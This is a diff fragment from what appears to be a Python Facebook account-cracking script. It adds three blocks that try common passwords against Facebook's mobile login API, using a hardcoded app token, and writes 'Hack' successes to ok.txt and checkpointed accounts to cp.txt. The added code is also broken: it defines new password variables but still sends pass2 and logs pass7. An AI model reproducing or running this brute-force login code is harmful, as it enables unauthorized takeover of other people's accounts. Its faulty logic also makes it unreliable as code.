@@ -365,7 +365,57 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass7+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-															
+ 		                                                    pass8= "Password"
+		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		                                                    d=json.loads(q)
+		                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                        print("Error "+uid+" | "+pass7+" --> CP")
+		                                                        cp=open("cp.txt","a")
+		                                                        cp.write(uid+" | "+pass7+"\n")
+		                                                        cp.close()
+		                                                        cps.append(uid)
+		                                                    else:
+		                                                        if 'access_token' in d:
+		                                                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
+		                                                            ok=open("ok.txt","a")
+		                                                            ok.write(uid+" | "+pass7+"\n")
+		                                                            ok.close()
+		                                                            oks.append(uid)
+		                                                    pass9= "Facebook"
+		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		                                                    d=json.loads(q)
+		                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                        print("Error "+uid+" | "+pass7+" --> CP")
+		                                                        cp=open("cp.txt","a")
+		                                                        cp.write(uid+" | "+pass7+"\n")
+		                                                        cp.close()
+		                                                        cps.append(uid)
+		                                                    else:
+		                                                        if 'access_token' in d:
+		                                                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
+		                                                            ok=open("ok.txt","a")
+		                                                            ok.write(uid+" | "+pass7+"\n")
+		                                                            ok.close()
+		                                                    pass10= "112233"
+		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		                                                    d=json.loads(q)
+		                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                        print("Error "+uid+" | "+pass7+" --> CP")
+		                                                        cp=open("cp.txt","a")
+		                                                        cp.write(uid+" | "+pass7+"\n")
+		                                                        cp.close()
+		                                                        cps.append(uid)
+		                                                    else:
+		                                                        if 'access_token' in d:
+		                                                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
+		                                                            ok=open("ok.txt","a")
+		                                                            ok.write(uid+" | "+pass7+"\n")
+		                                                            ok.close()
+		                    
+		                    
+
+
+												
 		except:
 			pass
 		
